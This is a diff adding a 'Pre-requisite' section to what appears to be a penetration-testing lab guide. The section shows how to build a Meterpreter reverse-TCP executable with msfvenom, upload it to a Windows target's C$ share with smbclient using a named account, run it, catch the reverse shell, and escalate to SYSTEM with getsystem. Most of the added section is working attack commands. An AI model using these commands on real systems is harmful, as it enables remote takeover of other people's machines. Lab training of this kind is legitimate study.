@@ -2,6 +2,44 @@
 
 ---
 
+Pre-requisite
+
+```
+## 🔑 Gaining Administrative Rights on the Target Machine
+
+> Before proceeding with the main steps, you may need to gain administrative rights on the target machine. Here's how you can create a malicious executable and transfer it to the target machine using `msfvenom` and `smbclient`.
+
+### 🧱 Step 0: Create a Malicious Executable with msfvenom
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe -o malicious.exe
+```
+- Replace `LHOST` with your Kali machine's IP address.
+- Replace `LPORT` with the port you want to use for the reverse shell.
+
+### 🧱 Step 1: Transfer the Executable to the Target Machine
+Use `smbclient` to copy the malicious executable to a writable share on the target machine:
+```bash
+smbclient //172.22.117.20/C$ -U tstark
+put malicious.exe
+```
+- Replace `//172.22.117.20/C$` with the target machine's SMB share path.
+- Replace `tstark` with the username that has access to the share.
+
+### 🧱 Step 2: Execute the Malicious File on the Target Machine
+Gain access to the target machine and execute the file:
+1. Use `psexec`, RDP, or another method to log in.
+2. Navigate to the location of `malicious.exe` and run it.
+
+### 🧱 Step 3: Catch the Reverse Shell
+Ensure your Metasploit listener is running (refer to **Phase 1: Listener Setup**) to catch the reverse shell.
+
+> ✅ Once the reverse shell is established, you can escalate to SYSTEM-level rights using Meterpreter commands like `getsystem`.
+
+---
+> **Note:** This step assumes you have valid credentials to access the target machine. If not, you'll need to explore other techniques to gain initial access.
+
+```
+
 ## 🧪 Phase 1: Set Up the Listener in Kali Linux
 
 > Think of this as “setting the trap” to catch the shell.
